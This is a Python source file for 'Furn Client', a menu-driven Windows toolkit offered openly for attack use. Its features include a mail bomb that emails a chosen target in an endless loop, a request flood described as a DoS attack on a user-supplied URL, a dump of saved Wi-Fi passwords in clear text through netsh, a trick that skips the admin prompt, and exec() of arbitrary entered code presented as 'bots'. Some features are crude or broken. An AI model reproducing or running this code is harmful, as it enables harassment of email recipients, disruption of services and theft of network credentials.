#Imports
import requests
import socket
import subprocess
import sys
import time
import urllib
import os
import random
#Imports for email spam
import yagmail

#Bot data
def random_bot_traffic():
    randomtraffic = f"{random.randint(1,3)}"
    if randomtraffic == "1":
        t = "https://www.youtube.com"
    if randomtraffic == "2":
        t = "https://www.amazon.com"
    if randomtraffic == "3":
        t = "https://www.google.com"
    return t




def create_bot_data():
    Bot_Ip = f"{random.randint(1, 225)}.{random.randint(1, 225)}.{random.randint(1, 225)}.{random.randint(1, 225)}"
    Bot_Id = f"{random.randint(10,99)}:{random.randint(100,999)}"
    random_bot_traffic()
    return Bot_Ip, Bot_Id





#Ip vars
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

#Info
Ver = "1.2.1"
Build = "004"
Latest_update =  "Added a socket connection system. (10.)"

#Custom stuff
from colorama import init, Fore
init()
import ctypes

ctypes.windll.kernel32.SetConsoleTitleW("Furn Client")
from colorama import Fore, Style, init

#Functions

import requests

def get_ip_info(ip):
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url)
    data = response.json()
    return data

ip = "8.8.8.8" 
info = get_ip_info(ip)


#Create email spam
sender_email = "your_email@gmail.com"
receiver_email = "recipient@example.com"
app_password = "your_email_password"



# Main

logo = r"""

 ________ ___  ___  ________  ________      
|\  _____\\  \|\  \|\   __  \|\   ___  \    
\ \  \__/\ \  \\\  \ \  \|\  \ \  \\ \  \   
 \ \   __\\ \  \\\  \ \   _  _\ \  \\ \  \  
  \ \  \_| \ \  \\\  \ \  \\  \\ \  \\ \  \ 
   \ \__\   \ \_______\ \__\\ _\\ \__\\ \__\
    \|__|    \|_______|\|__|\|__|\|__| \|__|

"""

print(logo)
print("\n")
print("Version ",Ver,".")

Options = """
1. Fetch IP address | Gets the networks IP address and hostname of your pc.
2. Shut down all | Shuts down all computers on your network. Press add and paste ip address.
3. IP locate | Finds the location of a IP address provided by the user. Must be a public IP.
4. Mail Bomb | Spams a certain email forever
5. Show Net Pass | Allows a user to view a networks password and other info.
6. Bypass admin | Allows users to bypass the admin prompt.
7. Trace | Trace where your data is going on a certain domain/website.
8. DoS attack | Overloads a server with network traffic. Input the victim as a URL.
9. BotSpam | Create a bot ready to execute any python code.
10. Socket connector | Connects the user to a server that communicates with clients via network.
11. Ver | View FURN's latest updates and the current version.
12. Install Packages | Installs the required packages for Furn to work properly.
13. Exit | Exit the Furn application.

"""

while True:
    print("\n")
    print(Options)

    SelectedOption = input("Option: ")

    # Detect Option/Input 1
    if SelectedOption == "1":
        print("IP address ", IPAddr, ", hostname ", hostname, ".")
    
    # Detect Option/Input 2
    elif SelectedOption == "2":
        print("Remote shut down")
        cmd = "shutdown -i" 
        subprocess.run(cmd, shell=True)


    # Detect Option/Input 3
    elif SelectedOption == "3":
        IPlookup = input("IP addresss to locate.")
        info = get_ip_info(IPlookup)
        print(info)

        # Detect Option/Input 4
    elif SelectedOption == "4":
        print("Mail bomb")
        sender_email = input("Sender email: ")
        receiver_email = input("Receiver email: ")
        app_password = input("16-character App Password: ")
        while True:
            yag = yagmail.SMTP(sender_email, app_password)
            yag.send(to=receiver_email, subject="RnVybiB3YXMgaGVyZQ==", contents="RnVybg==")

    # Detect Option/Input 5
    elif SelectedOption == "5":
        print("Network password viewer")
        cmd = "netsh wlan show profile" 
        subprocess.run(cmd, shell=True)
        NetPassToFind = input("What ntwrks pass would you like to view? ")
        cmd = f"netsh wlan show profile {NetPassToFind} key=clear"
        subprocess.run(cmd, shell=True)


            # Detect Option/Input 6
    elif SelectedOption == "6":
        print("Bypass admin prompt.")
        ApplicationToBypass = input("File/Application to bypass: ")
        cmd = "set __compact_layer=runasinvoker" 
        subprocess.run(cmd, shell=True)
        cmd = f"start {ApplicationToBypass}" 
        subprocess.run(cmd, shell=True)


    # Detect Option/Input 7
    elif SelectedOption == "7":
        print("Data Trace")
        WebsiteToTrace = input("Website to trace (E.g google.com): ")
        cmd = f"tracert {WebsiteToTrace}" 
        subprocess.run(cmd, shell=True)

    # Detect Option/Input 8
    elif SelectedOption == "8":
        print("Dos attack")
        target = input("Input the url (E.g https://www.youtube.com): ")
        while True: 
            r = requests.get(target)
            if r.status_code == 200:
                print(f"Attacking {target}")
            else:
                print(Fore.RED + f"Failed to attack {target} -- error code {r.status_code}." + Fore.RESET)
                time.sleep(5)
                print("Exiting FURN")
                sys.exit()


    # Detect Option/Input 9
    elif SelectedOption == "9":
        print("BotSpam")
        Number_Of_Bots = int(input("How many bots would you like to create?: "))
        for i in range(Number_Of_Bots):
          my_ip, my_id = create_bot_data()
          t = random_bot_traffic()
          print(f"Routing bot {Fore.MAGENTA}{my_id}{Style.RESET_ALL} to {Fore.MAGENTA}{t}{Style.RESET_ALL}.")
          print(f"Bot Ip: {my_ip}, Bot Id: {my_id}")
          print(Fore.RED + "Bot created." + Fore.RESET)
          Code_to_run = input("Enter the code you would like to run: ")
          exec(Code_to_run)
          Run_Loop = input("Would you like to run this code forever? y/n: ")
          if Run_Loop == "y":
            while True:
                my_ip, my_id = create_bot_data()
                print(f"Bot Ip: {my_ip}, Bot Id: {my_id}")
                print("Bot created")
                exec(Code_to_run)


    # Detect Option/Input 10
    elif SelectedOption == "10":
        print("Socket connector")
        LocalSocket = socket.socket()
        Port_To_Connect = input("Port?: ")
        IP_To_Connect = input("Ip adress?: ")
        try:
            LocalSocket.connect((IP_To_Connect,Port_To_Connect))
            print(Fore.GREEN+ f"Socket connected successfully! Running on port {Port_To_Connect} and Ip adress {IP_To_Connect}" + Fore.RESET)
            
        except:
            print(Fore.RED + "Socket failed to connect." + Fore.RESET)

        Request_To_Make = input("What would you like to send?: ")
        LocalSocket.send(Request_To_Make)
        print(Fore.GREEN+ f"Successfully sent {Fore.MAGENTA}{Request_To_Make}{Style.RESET_ALL} from port {Fore.MAGENTA}{Port_To_Connect}{Style.RESET_ALL}." + Fore.RESET)
        LocalSocket.close()
    






    # Detect Option/Input 11
    elif SelectedOption == "11":
        print(Latest_update, ", version ",Ver,", build ",Build)



    # Detect Option/Input 12
    elif SelectedOption == "12":
        print(Fore.CYAN + "Installing requests" + Fore.RESET)
        cmd = "pip install requests"
        subprocess.run(cmd, shell=True)
        print(Fore.CYAN + "Installing colorama" + Fore.RESET)
        cmd = "pip install colorama"
        subprocess.run(cmd, shell=True)
        print(Fore.CYAN + "Installing yagmail" + Fore.RESET)
        cmd = "pip install yagmail"
        subprocess.run(cmd, shell=True)
        print(Fore.GREEN + "installed all required libraries!" + Fore.RESET)
    

    # Detect Option/Input 13
    elif SelectedOption == "13":
        print("Exiting FURN application...")
        time.sleep(2)
        sys.exit()
